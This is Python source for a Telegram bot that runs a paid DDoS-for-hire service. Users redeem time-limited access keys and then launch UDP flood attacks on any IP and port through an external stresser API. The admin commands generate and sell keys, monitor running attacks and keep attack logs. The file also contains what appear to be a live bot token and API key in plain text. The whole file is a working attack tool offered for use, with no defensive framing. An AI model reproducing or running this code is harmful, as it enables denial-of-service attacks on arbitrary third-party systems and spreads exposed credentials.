import telebot
import requests
import time
import threading
import json
import os
from datetime import datetime, timedelta
import re
import random
import string

# ============= CONFIGURATION =============
BOT_TOKEN = "7626383881:AAHlLDcUCFWf0EMKlTtZaGAi-1XGbbEWK0w"  # Telegram Bot Token
API_KEY = "6378cea5c08195f4c92db7b8fe80966daa91cc20f5eb3fda160a815d86c9f348"
API_BASE_URL = "https://retrostress.net/api/start"
ADMIN_ID = 5194407058  # YOUR TELEGRAM USER ID (ADMIN)

# Attack limits
COOLDOWN = 60
MAX_CONCURRENT = 13
MIN_DURATION = 30
MAX_DURATION = 300

# ============= DATA STORAGE =============
DATA_FILE = "bot_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "users": {},
        "keys": {},
        "active_attacks": {},
        "api_usage": {
            "total_requests": 0,
            "successful": 0,
            "failed": 0,
            "last_reset": datetime.now().isoformat()
        },
        "attack_history": []
    }

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Load data
data = load_data()
active_attacks = data["active_attacks"]
api_usage = data["api_usage"]
attack_history = data["attack_history"]
users = data["users"]
keys = data["keys"]

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# ============= HELPER FUNCTIONS =============
def reset_usage():
    global api_usage
    last_reset = datetime.fromisoformat(api_usage["last_reset"])
    if datetime.now() - last_reset > timedelta(days=1):
        api_usage = {
            "total_requests": 0,
            "successful": 0,
            "failed": 0,
            "last_reset": datetime.now().isoformat()
        }
        save_data(data)
        return True
    return False

def call_api(ip, port, duration):
    global api_usage
    
    reset_usage()
    api_usage["total_requests"] += 1
    
    try:
        params = {
            "key": API_KEY,
            "target": ip,
            "port": port,
            "time": duration,
            "method": "UDP-BIG"
        }
        
        response = requests.get(API_BASE_URL, params=params, timeout=15)
        
        if response.status_code == 201 or response.status_code == 200:
            api_usage["successful"] += 1
            save_data(data)
            return True, {"message": "Attack started"}
        else:
            api_usage["failed"] += 1
            save_data(data)
            return False, f"HTTP Error: {response.status_code}"
            
    except requests.exceptions.RequestException as e:
        api_usage["failed"] += 1
        save_data(data)
        return False, f"Connection Error: {str(e)}"

def is_user_on_cooldown(user_id):
    if str(user_id) in users:
        user_data = users[str(user_id)]
        last_attack = user_data.get("last_attack", 0)
        if time.time() - last_attack < COOLDOWN:
            remaining = int(COOLDOWN - (time.time() - last_attack))
            return True, remaining
    return False, 0

def get_active_count():
    return sum(1 for attack in active_attacks.values() if attack["active"])

def can_start_attack():
    active_count = get_active_count()
    return active_count < MAX_CONCURRENT, active_count

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(p) <= 255 for p in parts)
    return False

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def is_user_valid(user_id):
    user_id = str(user_id)
    if user_id == str(ADMIN_ID):
        return True
    if user_id in users:
        expiry = users[user_id].get("expiry", 0)
        if expiry > time.time():
            return True
    return False

def format_time(seconds):
    minutes = int(seconds // 60)
    secs = int(seconds % 60)
    if minutes > 0:
        return f"{minutes}m {secs}s"
    else:
        return f"{secs}s"

def parse_duration(duration_str):
    """Parse duration like 1h, 6h, 12h, 30d, 7d"""
    duration_str = duration_str.lower().strip()
    
    if duration_str.endswith('h'):
        try:
            hours = int(duration_str[:-1])
            return hours * 3600  # Convert hours to seconds
        except:
            return None
    elif duration_str.endswith('d'):
        try:
            days = int(duration_str[:-1])
            return days * 86400  # Convert days to seconds
        except:
            return None
    else:
        try:
            return int(duration_str)  # Seconds
        except:
            return None

def format_duration_display(seconds):
    """Display duration in human readable format"""
    if seconds >= 86400:
        days = seconds // 86400
        return f"{days}d"
    elif seconds >= 3600:
        hours = seconds // 3600
        return f"{hours}h"
    elif seconds >= 60:
        minutes = seconds // 60
        return f"{minutes}m"
    else:
        return f"{seconds}s"

# ============= BOT COMMANDS =============

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    
    if is_user_valid(user_id):
        welcome_text = f"""
🔥 *Attack Bot*

/attack <IP> <PORT> <DURATION> - Start attack
  Example: `/attack 205.196.19.170 80 60`

⚙️ *Limits:*
• Cooldown: 60 seconds
• Max concurrent: 13 attacks
• Duration: {MIN_DURATION}-{MAX_DURATION} seconds
        """
        bot.reply_to(message, welcome_text, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ *Access Denied!*\n\nUse `/redeem <KEY>` to get access.", parse_mode='Markdown')

@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    user_id = message.from_user.id
    args = message.text.split()
    
    if len(args) != 2:
        bot.reply_to(message, "❌ *Usage:* `/redeem <KEY>`", parse_mode='Markdown')
        return
    
    key = args[1]
    
    if key not in keys:
        bot.reply_to(message, "❌ *Invalid key!*", parse_mode='Markdown')
        return
    
    key_data = keys[key]
    
    if key_data["used"]:
        bot.reply_to(message, "❌ *Key already used!*", parse_mode='Markdown')
        return
    
    if key_data["expiry"] < time.time():
        bot.reply_to(message, "❌ *Key expired!*", parse_mode='Markdown')
        return
    
    # Redeem key
    keys[key]["used"] = True
    keys[key]["used_by"] = user_id
    
    # Add user
    users[str(user_id)] = {
        "joined": time.time(),
        "expiry": key_data["expiry"],
        "keys_used": [key],
        "last_attack": 0
    }
    save_data(data)
    
    # Calculate expiry display
    expiry_display = format_duration_display(key_data["expiry"] - time.time())
    
    bot.reply_to(message, f"✅ *Access Granted!*\n\n📅 Expires: `{datetime.fromtimestamp(key_data['expiry']).strftime('%Y-%m-%d %H:%M')}`\n⏱ Duration: `{expiry_display}`\n\nUse `/start` to see commands.", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    
    if not is_user_valid(user_id):
        bot.reply_to(message, "❌ *Access Denied!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, f"❌ *Usage:* `/attack <IP> <PORT> <DURATION>`\nExample: `/attack 205.196.19.170 80 60`\n\nDuration: {MIN_DURATION}-{MAX_DURATION} seconds", parse_mode='Markdown')
        return
    
    ip = args[1]
    port = args[2]
    
    if not validate_ip(ip):
        bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
        return
    
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ *Invalid port!* Must be 1-65535", parse_mode='Markdown')
        return
    
    try:
        duration = int(args[3])
    except ValueError:
        bot.reply_to(message, "❌ *Invalid duration!*", parse_mode='Markdown')
        return
    
    if not (MIN_DURATION <= duration <= MAX_DURATION):
        bot.reply_to(message, f"❌ *Duration must be {MIN_DURATION}-{MAX_DURATION} seconds*", parse_mode='Markdown')
        return
    
    on_cooldown, remaining = is_user_on_cooldown(user_id)
    if on_cooldown:
        bot.reply_to(message, f"⏳ *Cooldown!* Wait {remaining}s", parse_mode='Markdown')
        return
    
    can_start, active_count = can_start_attack()
    if not can_start:
        bot.reply_to(message, f"⚠️ *Max concurrent reached!* ({active_count}/{MAX_CONCURRENT})", parse_mode='Markdown')
        return
    
    duration_display = format_time(duration)
    
    status_msg = bot.reply_to(message, f"🔄 *Starting attack...*\n\n🌐 Target: `{ip}:{port}`\n⏱ Duration: `{duration_display}`\n📊 Active: `{active_count+1}/{MAX_CONCURRENT}`", parse_mode='Markdown')
    
    success, result = call_api(ip, port, duration)
    
    attack_id = f"{user_id}_{int(time.time())}"
    attack_start_time = time.time()
    
    active_attacks[attack_id] = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "start_time": attack_start_time,
        "active": success,
        "status": "Running" if success else "Failed",
        "chat_id": message.chat.id,
        "message_id": status_msg.message_id
    }
    
    if str(user_id) in users:
        users[str(user_id)]["last_attack"] = time.time()
    save_data(data)
    
    if success:
        attack_history.append({
            "user": message.from_user.username or message.from_user.first_name,
            "user_id": user_id,
            "target": f"{ip}:{port}",
            "duration": duration,
            "duration_display": duration_display,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "Success"
        })
        if len(attack_history) > 50:
            attack_history.pop(0)
        save_data(data)
        
        def countdown_timer():
            timer_msg = bot.send_message(
                message.chat.id,
                f"⏱ *Attack Running*\n\n🌐 Target: `{ip}:{port}`\n⏳ Remaining: `{format_time(duration)}`\n📊 Active: `{get_active_count()}/{MAX_CONCURRENT}`",
                parse_mode='Markdown'
            )
            
            for remaining in range(duration, 0, -1):
                try:
                    bot.edit_message_text(
                        f"⏱ *Attack Running*\n\n🌐 Target: `{ip}:{port}`\n⏳ Remaining: `{format_time(remaining)}`\n📊 Active: `{get_active_count()}/{MAX_CONCURRENT}`",
                        chat_id=message.chat.id,
                        message_id=timer_msg.message_id,
                        parse_mode='Markdown'
                    )
                except:
                    pass
                time.sleep(1)
            
            try:
                bot.edit_message_text(
                    f"✅ *Attack Complete!*\n\n🌐 Target: `{ip}:{port}`\n⏱ Duration: `{duration_display}`\n📊 Active: `{get_active_count()}/{MAX_CONCURRENT}`",
                    chat_id=message.chat.id,
                    message_id=timer_msg.message_id,
                    parse_mode='Markdown'
                )
            except:
                pass
            
            try:
                bot.edit_message_text(
                    f"✅ *Attack Complete!*\n\n🌐 Target: `{ip}:{port}`\n⏱ Duration: `{duration_display}`\n📊 Active: `{get_active_count()}/{MAX_CONCURRENT}`",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode='Markdown'
                )
            except:
                pass
            
            if attack_id in active_attacks:
                active_attacks[attack_id]["active"] = False
                active_attacks[attack_id]["status"] = "Completed"
                save_data(data)
        
        threading.Thread(target=countdown_timer, daemon=True).start()
        
    else:
        active_attacks[attack_id]["active"] = False
        active_attacks[attack_id]["status"] = "Failed"
        save_data(data)
        
        attack_history.append({
            "user": message.from_user.username or message.from_user.first_name,
            "user_id": user_id,
            "target": f"{ip}:{port}",
            "duration": duration,
            "duration_display": duration_display,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "Failed"
        })
        save_data(data)
        
        bot.edit_message_text(
            f"❌ *Attack failed!*\n\n🌐 Target: `{ip}:{port}`\n\nError: `{result}`",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='Markdown'
        )

# ============= ADMIN COMMANDS =============

@bot.message_handler(commands=['admin'])
def handle_admin(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    admin_text = """
👑 *Admin Panel*

📊 `/astatus` - Real-time attack status
🔑 `/genkey <KEY> <DURATION>` - Generate custom key
   Duration: 1h, 6h, 12h, 24h, 2d, 7d, 30d
🔑 `/genbulk <COUNT> <DURATION>` - Bulk keys
📊 `/users` - List users
👤 `/userinfo <ID>` - User details
🚫 `/revoke <ID>` - Revoke user
⚙️ `/setexpiry <ID> <DURATION>` - Set expiry
📜 `/logs` - Attack logs
📈 `/adminstats` - Full stats
    """
    bot.reply_to(message, admin_text, parse_mode='Markdown')

@bot.message_handler(commands=['astatus'])
def handle_admin_status(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    active = get_active_count()
    
    if active == 0:
        bot.reply_to(message, "📭 *No active attacks running*", parse_mode='Markdown')
        return
    
    attack_list = "🔥 *Active Attacks*\n\n"
    for aid, attack in active_attacks.items():
        if attack["active"]:
            elapsed = int(time.time() - attack["start_time"])
            remaining = attack["duration"] - elapsed
            attack_list += f"🆔 `{aid}`\n"
            attack_list += f"🌐 Target: `{attack['ip']}:{attack['port']}`\n"
            attack_list += f"👤 User: `{attack['user_id']}`\n"
            attack_list += f"⏳ Remaining: `{format_time(max(0, remaining))}`\n"
            attack_list += f"📊 Status: `{attack['status']}`\n"
            attack_list += "─" * 20 + "\n"
    
    attack_list += f"\n📊 *Total Active:* `{active}/{MAX_CONCURRENT}`"
    
    bot.reply_to(message, attack_list, parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def handle_genkey(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    
    # /genkey <KEY> <DURATION> or /genkey <DURATION>
    if len(args) == 2:
        # Check if first arg is duration or key
        duration_seconds = parse_duration(args[1])
        if duration_seconds is not None:
            key = generate_key()
            expiry = time.time() + duration_seconds
            duration_display = format_duration_display(duration_seconds)
        else:
            key = args[1].upper()
            expiry = time.time() + (30 * 86400)  # Default 30 days
            duration_display = "30d"
    elif len(args) == 3:
        key = args[1].upper()
        duration_seconds = parse_duration(args[2])
        if duration_seconds is None:
            bot.reply_to(message, "❌ *Invalid duration!* Use: 1h, 6h, 12h, 24h, 2d, 7d, 30d", parse_mode='Markdown')
            return
        expiry = time.time() + duration_seconds
        duration_display = format_duration_display(duration_seconds)
    else:
        key = generate_key()
        expiry = time.time() + (30 * 86400)
        duration_display = "30d"
    
    # Validate key
    if not re.match(r'^[A-Z0-9_]+$', key):
        bot.reply_to(message, "❌ *Invalid key format!* Use only A-Z, 0-9, _", parse_mode='Markdown')
        return
    
    if len(key) < 4 or len(key) > 32:
        bot.reply_to(message, "❌ *Key length must be 4-32 characters*", parse_mode='Markdown')
        return
    
    # Check if key already exists
    if key in keys:
        bot.reply_to(message, "❌ *Key already exists!* Choose another name.", parse_mode='Markdown')
        return
    
    keys[key] = {
        "created_by": user_id,
        "created_at": time.time(),
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "custom": True
    }
    save_data(data)
    
    bot.reply_to(message, f"✅ *Custom Key Generated!*\n\n🔑 `{key}`\n⏱ Duration: `{duration_display}`\n📅 Expires: `{datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M')}`\n\nShare this key with users.", parse_mode='Markdown')

@bot.message_handler(commands=['genbulk'])
def handle_genbulk(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    
    if len(args) != 3:
        bot.reply_to(message, "❌ *Usage:* `/genbulk <COUNT> <DURATION>`\nExample: `/genbulk 5 30d` or `/genbulk 10 24h`", parse_mode='Markdown')
        return
    
    try:
        count = int(args[1])
    except:
        bot.reply_to(message, "❌ *Invalid count!*", parse_mode='Markdown')
        return
    
    duration_seconds = parse_duration(args[2])
    if duration_seconds is None:
        bot.reply_to(message, "❌ *Invalid duration!* Use: 1h, 6h, 12h, 24h, 2d, 7d, 30d", parse_mode='Markdown')
        return
    
    if count < 1 or count > 100:
        bot.reply_to(message, "❌ *Count must be 1-100*", parse_mode='Markdown')
        return
    
    duration_display = format_duration_display(duration_seconds)
    generated_keys = []
    expiry = time.time() + duration_seconds
    
    for i in range(count):
        key = generate_key()
        keys[key] = {
            "created_by": user_id,
            "created_at": time.time(),
            "expiry": expiry,
            "used": False,
            "used_by": None
        }
        generated_keys.append(key)
    
    save_data(data)
    
    keys_text = "\n".join([f"`{k}`" for k in generated_keys])
    
    bot.reply_to(message, 
        f"✅ *Bulk Keys Generated!*\n\n"
        f"📊 Count: `{count}`\n"
        f"⏱ Duration: `{duration_display}`\n\n"
        f"🔑 *Keys:*\n{keys_text}",
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['setexpiry'])
def handle_setexpiry(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "❌ *Usage:* `/setexpiry <ID> <DURATION>`\nExample: `/setexpiry 123456789 30d` or `/setexpiry 123456789 24h`", parse_mode='Markdown')
        return
    
    target_id = args[1]
    
    duration_seconds = parse_duration(args[2])
    if duration_seconds is None:
        bot.reply_to(message, "❌ *Invalid duration!* Use: 1h, 6h, 12h, 24h, 2d, 7d, 30d", parse_mode='Markdown')
        return
    
    if target_id not in users:
        bot.reply_to(message, "❌ *User not found!*", parse_mode='Markdown')
        return
    
    duration_display = format_duration_display(duration_seconds)
    users[target_id]["expiry"] = time.time() + duration_seconds
    save_data(data)
    
    bot.reply_to(message, f"✅ *User {target_id} expiry set to `{duration_display}`!*", parse_mode='Markdown')

@bot.message_handler(commands=['users'])
def handle_users(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    if not users:
        bot.reply_to(message, "📭 *No users*", parse_mode='Markdown')
        return
    
    user_list = "👥 *Users*\n\n"
    for uid, uinfo in users.items():
        remaining = uinfo["expiry"] - time.time()
        if remaining > 0:
            duration = format_duration_display(remaining)
        else:
            duration = "Expired"
        user_list += f"🆔 `{uid}` | Remaining: `{duration}`\n"
    
    bot.reply_to(message, user_list, parse_mode='Markdown')

@bot.message_handler(commands=['userinfo'])
def handle_userinfo(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ *Usage:* `/userinfo <ID>`", parse_mode='Markdown')
        return
    
    target_id = args[1]
    
    if target_id not in users:
        bot.reply_to(message, "❌ *User not found!*", parse_mode='Markdown')
        return
    
    uinfo = users[target_id]
    expiry = datetime.fromtimestamp(uinfo["expiry"]).strftime('%Y-%m-%d %H:%M')
    joined = datetime.fromtimestamp(uinfo["joined"]).strftime('%Y-%m-%d %H:%M')
    remaining = uinfo["expiry"] - time.time()
    remaining_display = format_duration_display(max(0, remaining))
    
    info_text = f"""
👤 *User Info*

🆔 ID: `{target_id}`
📅 Joined: `{joined}`
⏰ Expires: `{expiry}`
⏱ Remaining: `{remaining_display}`
    """
    bot.reply_to(message, info_text, parse_mode='Markdown')

@bot.message_handler(commands=['revoke'])
def handle_revoke(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❌ *Usage:* `/revoke <ID>`", parse_mode='Markdown')
        return
    
    target_id = args[1]
    
    if target_id not in users:
        bot.reply_to(message, "❌ *User not found!*", parse_mode='Markdown')
        return
    
    del users[target_id]
    save_data(data)
    
    bot.reply_to(message, f"✅ *User {target_id} revoked!*", parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    if not attack_history:
        bot.reply_to(message, "📭 *No logs*", parse_mode='Markdown')
        return
    
    log_text = "📜 *Attack Logs* (Last 20)\n\n"
    for i, log in enumerate(reversed(attack_history[-20:]), 1):
        status_emoji = "✅" if log["status"] == "Success" else "❌"
        duration_display = log.get('duration_display', f"{log['duration']}s")
        log_text += f"{i}. {status_emoji} `{log['target']}` | {duration_display} | {log['user']}\n"
    
    bot.reply_to(message, log_text, parse_mode='Markdown')

@bot.message_handler(commands=['adminstats'])
def handle_adminstats(message):
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ *Admin only!*", parse_mode='Markdown')
        return
    
    total_attacks = len(attack_history)
    successful = len([h for h in attack_history if h["status"] == "Success"])
    failed = total_attacks - successful
    
    stats_text = f"""
📊 *Full Stats*

👥 Users: `{len(users)}`
🔑 Keys: `{len(keys)}`
🎯 Attacks: `{total_attacks}`
✅ Success: `{successful}`
❌ Failed: `{failed}`

📈 API:
• Total: `{api_usage['total_requests']}`
• Success: `{api_usage['successful']}`
• Failed: `{api_usage['failed']}`

🔥 Active: `{get_active_count()}/{MAX_CONCURRENT}`
    """
    bot.reply_to(message, stats_text, parse_mode='Markdown')

# ============= RUN BOT =============
if __name__ == "__main__":
    print("🤖 Attack Bot Started!")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🔥 Max Concurrent: {MAX_CONCURRENT}")
    print(f"⏱ Duration: {MIN_DURATION}s - {MAX_DURATION}s")
    print("Bot is running...")
    bot.infinity_polling()
